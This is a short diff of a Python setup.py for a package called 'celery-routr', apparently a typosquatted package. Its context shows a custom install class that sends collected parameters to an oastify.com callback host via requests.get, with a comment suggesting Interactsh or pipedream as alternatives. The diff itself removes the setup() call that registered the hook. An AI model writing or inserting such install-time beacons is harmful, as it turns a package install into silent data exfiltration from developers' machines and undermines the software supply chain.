@@ -15,11 +15,5 @@ class CustomInstall(install):
         requests.get("jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='celery-routr', #package name
-      version='1.0.0',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                
 
